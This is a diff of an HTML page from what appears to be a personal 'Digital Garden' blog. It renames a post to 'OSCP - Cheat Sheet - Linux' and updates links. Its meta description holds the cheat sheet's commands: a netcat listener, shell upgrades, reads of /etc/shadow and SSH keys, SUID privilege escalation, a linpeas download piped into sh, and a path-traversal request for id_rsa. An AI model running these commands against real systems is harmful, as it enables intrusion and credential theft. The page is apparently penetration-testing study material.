@@ -2,18 +2,18 @@
 <html lang="en">
 <head>
   
-    <title>Cheat Sheet - Linux :: Digital Garden</title>
+    <title>OSCP - Cheat Sheet - Linux :: Digital Garden</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content=" Initial Access Launch Netcat Listener: nc -nvlp 1234 Launch HTML server: `python3 -m http.server 80 Launch Python Virtual Environment:
+<meta name="description" content="Initial Access Launch Netcat Listener: nc -nvlp 1234 Launch HTML server: `python3 -m http.server 80 Launch Python Virtual Environment:
 cd ~/py `python3 -m venv venv source bin/activate Run enum4linux-ng: enum4linux-ng -A 192.168.x.xRun enum4linux:enum4linux 192.168.x.x` (Run both tools) PrivEsc Upgrade Shell `/usr/bin/script -qc /bin/bash /dev/null `python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo; `python3 -c &ldquo;import pty; pty.spawn(&rsquo;/bin/sh&rsquo;)&rdquo; /bin/sh -i | /bin/bash -i | echo &#39;os.system(&#39;/bin/bash&#39;)&#39; perl -e &#39;exec &quot;/bin/sh&quot;;&#39; To escape rbash ssh user@ip -t &quot;bash --noprofile&quot; export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin Enumerate find / -name local.txt -type f 2&gt;/dev/null id cat /etc/passwd | cat /etc/shadow | cat /root/.ssh hostname, cat /etc/issue,cat /etc/os-release, uname -a /home/andrew/.bash_history sudo -l &ndash;&gt; check GTFOBins crontab -l su root:root, su andrew:andrew, su andrew:(NOPASS), sudo -i (reqs root password) ls /var/mail | ls /var/spool/mail /usr/sbin/getcap -r / 2&gt;/dev/null If member of Disk Group df -h (find OS) | debugfs /dva/OS | /etc/shadow /root/.ssh Binaries find / -perm -4000 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot; ls -lah &amp; check GTFObins Processes: ps -eaf Watch processes:watch -n 1 &quot;ps -aux | grep pass&quot; Pspy: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 wget $kaliIP/pspy32 chmod &#43;x pspy32 &amp; timeout 2m ./pspy32 If root is regularly running a writable script: echo &quot;chmod &#43;s /bin/bash&quot; &gt;&gt; script.sh then /bin/bash -p Enumeration Scripts: SUIDer: wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh LinPeas: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh LinEnum Kali Pre-installed unix-privesc-check Linux Exploit Suggester https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh Linux Smart Enumeration wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh Exploit RSA key on Linux server: curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa Random - To Sort exiftool -a -u file.pdf (metadata inspector)
 " />
 <meta name="keywords" content="" />
 
   <meta name="robots" content="noodp" />
 
-<link rel="canonical" href="/posts/cheat-sheet---oscp-linux/" />
+<link rel="canonical" href="/posts/oscp---cheat-sheet---linux/" />
 
 
 
@@ -79,11 +79,11 @@ cd ~/py `python3 -m venv venv source bin/activate Run enum4linux-ng: enum4linux-
 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="Cheat Sheet - Linux">
-<meta property="og:description" content=" Initial Access Launch Netcat Listener: nc -nvlp 1234 Launch HTML server: `python3 -m http.server 80 Launch Python Virtual Environment:
+<meta property="og:title" content="OSCP - Cheat Sheet - Linux">
+<meta property="og:description" content="Initial Access Launch Netcat Listener: nc -nvlp 1234 Launch HTML server: `python3 -m http.server 80 Launch Python Virtual Environment:
 cd ~/py `python3 -m venv venv source bin/activate Run enum4linux-ng: enum4linux-ng -A 192.168.x.xRun enum4linux:enum4linux 192.168.x.x` (Run both tools) PrivEsc Upgrade Shell `/usr/bin/script -qc /bin/bash /dev/null `python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo; `python3 -c &ldquo;import pty; pty.spawn(&rsquo;/bin/sh&rsquo;)&rdquo; /bin/sh -i | /bin/bash -i | echo &#39;os.system(&#39;/bin/bash&#39;)&#39; perl -e &#39;exec &quot;/bin/sh&quot;;&#39; To escape rbash ssh user@ip -t &quot;bash --noprofile&quot; export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin Enumerate find / -name local.txt -type f 2&gt;/dev/null id cat /etc/passwd | cat /etc/shadow | cat /root/.ssh hostname, cat /etc/issue,cat /etc/os-release, uname -a /home/andrew/.bash_history sudo -l &ndash;&gt; check GTFOBins crontab -l su root:root, su andrew:andrew, su andrew:(NOPASS), sudo -i (reqs root password) ls /var/mail | ls /var/spool/mail /usr/sbin/getcap -r / 2&gt;/dev/null If member of Disk Group df -h (find OS) | debugfs /dva/OS | /etc/shadow /root/.ssh Binaries find / -perm -4000 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot; ls -lah &amp; check GTFObins Processes: ps -eaf Watch processes:watch -n 1 &quot;ps -aux | grep pass&quot; Pspy: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 wget $kaliIP/pspy32 chmod &#43;x pspy32 &amp; timeout 2m ./pspy32 If root is regularly running a writable script: echo &quot;chmod &#43;s /bin/bash&quot; &gt;&gt; script.sh then /bin/bash -p Enumeration Scripts: SUIDer: wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh LinPeas: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh LinEnum Kali Pre-installed unix-privesc-check Linux Exploit Suggester https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh Linux Smart Enumeration wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh Exploit RSA key on Linux server: curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa Random - To Sort exiftool -a -u file.pdf (metadata inspector)
 " />
-<meta property="og:url" content="/posts/cheat-sheet---oscp-linux/" />
+<meta property="og:url" content="/posts/oscp---cheat-sheet---linux/" />
 <meta property="og:site_name" content="Digital Garden" />
 
   <meta property="og:image" content="/og-image.png">
@@ -178,7 +178,7 @@ cd ~/py `python3 -m venv venv source bin/activate Run enum4linux-ng: enum4linux-
     
 <article class="post">
   <h1 class="post-title">
-    <a href="/posts/cheat-sheet---oscp-linux/">Cheat Sheet - Linux</a>
+    <a href="/posts/oscp---cheat-sheet---linux/">OSCP - Cheat Sheet - Linux</a>
   </h1>
   <div class="post-meta"></div>
 
@@ -197,8 +197,7 @@ cd ~/py `python3 -m venv venv source bin/activate Run enum4linux-ng: enum4linux-
   
 
   <div class="post-content"><div>
-        <hr>
-<h1 id="initial-access">Initial Access<a href="#initial-access" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+        <h1 id="initial-access">Initial Access<a href="#initial-access" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <p>Launch Netcat Listener: <code>nc -nvlp 1234</code>
 Launch HTML server: `python3 -m http.server 80
 Launch Python Virtual Environment:</p>
@@ -415,16 +414,16 @@ Look for options with <code>setuid+ep</code> (set UID is <em>effective</em> and 
   </div>
   <div class="pagination__buttons">
     
-      <a href="/posts/cheat-sheet---cryptography/" class="button inline prev">
-        &lt; [<span class="button__text">Cheat Sheet - Cryptography</span>]
+      <a href="/posts/oscp---cheat-sheet---core/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Cheat Sheet - Core</span>]
       </a>
     
     
       ::
     
     
-      <a href="/posts/cheat-sheet---networking/" class="button inline next">
-         [<span class="button__text">Cheat Sheet - Networking</span>] &gt;
+      <a href="/posts/oscp---cheat-sheet---windows/" class="button inline next">
+         [<span class="button__text">OSCP - Cheat Sheet - Windows</span>] &gt;
       </a>
     
   </div>
